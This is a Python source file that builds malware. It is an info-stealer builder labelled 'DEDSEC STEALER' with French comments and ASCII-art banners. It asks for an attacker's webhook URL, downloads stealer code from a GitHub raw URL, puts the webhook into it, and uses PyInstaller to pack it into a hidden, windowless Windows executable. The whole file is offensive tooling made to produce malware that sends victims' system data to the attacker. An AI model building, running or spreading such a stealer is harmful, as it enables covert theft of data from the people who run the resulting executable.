from colorama import Fore, Style, init
import colorama 
import time
import requests
import shutil
import os
import PyInstaller.__main__

colorama.init()


start_time = time.time()  # Temps de départ
animation_chars = ['/','|','\\','-']

def loading():
    while (time.time() - start_time) < 6:  # Tant que le temps écoulé est inférieur à 6 secondes
       for char in animation_chars:
           print(f"{Fore.LIGHTWHITE_EX}//STARTING DEDSEC STEALER {Fore.LIGHTGREEN_EX}",char, end='\r')  # Utilise '\r' pour retourner au début de la ligne
           time.sleep(0.1)  # Délai de 0.1 seconde entre chaque caractère pour créer l'effet d'animation

# Après 6 secondes, imprime une chaîne vide pour effacer le dernier caractère de l'animation
print(' ' * len(animation_chars), end='\r')

print(f'''{Fore.LIGHTBLACK_EX}
                        |
                   pN▒g▒p▒g▒▒g▒ge
                  ▒▒▒▒▒▒▒▓▓▒▒▒▒▒
                _0▒▓▒▓▒▓▓▒▒▒▒▒▒▒!
                4▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▒Y
                |` ~~#00▓▓0▒MMM"M|
                      `gM▓M7
               |   {Fore.RED}o{Fore.LIGHTBLACK_EX}   00Q0   {Fore.RED}o{Fore.LIGHTBLACK_EX}   |
               #▒____g▒0▓▓P______0
               #▒0g_p#▓▓04▒▒&,__M#
               0▒▒▒▒▒00   ]0▒▒▒▒00
                |\j▒▒0'   '0▒▒▒4M'
                 |\#▒▒&▒▒gg▒▒0& |
                " ▒▒00▒▒▒▒00▒▒'d
                %  ¼▒  ~P▒¼▒▒|¼¼|
                M▒9▒,▒▒ ]▒] *▒j,g
                l▒g▒▒] @▒9
                 ~▒0▒▒▒p ▒g▒
                   @▓▒▒▒▒▒  ▒▒▓
                    M0▓▓  ▓▓^   

{Fore.LIGHTWHITE_EX}██████╗ ███████╗██████╗        {Fore.GREEN} ███████╗███████╗ ██████╗
{Fore.LIGHTWHITE_EX}██╔══██╗██╔════╝██╔══██╗       {Fore.GREEN} ██╔════╝██╔════╝██╔════╝
{Fore.LIGHTWHITE_EX}██║  ██║█████╗  ██║  ██║       {Fore.GREEN} ███████╗█████╗  ██║     
{Fore.LIGHTWHITE_EX}██║  ██║██╔══╝  ██║  ██║       {Fore.GREEN} ╚════██║██╔══╝  ██║     
{Fore.LIGHTWHITE_EX}██████╔╝███████╗██████╔╝       {Fore.GREEN} ███████║███████╗╚██████╗
{Fore.LIGHTWHITE_EX}╚═════╝ ╚══════╝╚═════╝        {Fore.GREEN} ╚══════╝╚══════╝ ╚═════╝
''')
loading()
print("")
webhookk = input(f"{Fore.LIGHTWHITE_EX}Input Webhook :{Fore.LIGHTGREEN_EX} ")
fileName = input(f"{Fore.LIGHTWHITE_EX}Input File Name :{Fore.LIGHTGREEN_EX} ")

with open(f"{fileName}.py", 'w') as a:
     a.write(f"""
import requests
import platform
import subprocess
import os
import socket
import psutil


WEBHOOK_URL = "{webhookk}"
""")

code = requests.get("https://raw.githubusercontent.com/RetrO-M/DEDSEC/main/dedsec.py").text.replace("WEBHOOK", webhookk)
with open(f"{fileName}.py", 'w') as f:
    f.write(code)

print(f"\nCreating {fileName}.exe\n")

PyInstaller.__main__.run([
        '%s.py' % fileName,
        '--name=%s' % fileName,
        '--onefile',
        '--noconsole',
        '--log-level=INFO',
        '--icon=NONE',
    ])
try:
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
except FileNotFoundError:
        pass

print(f"\nFile created as {fileName}.exe\n")
input(f'Enter anything to continue . . .  ')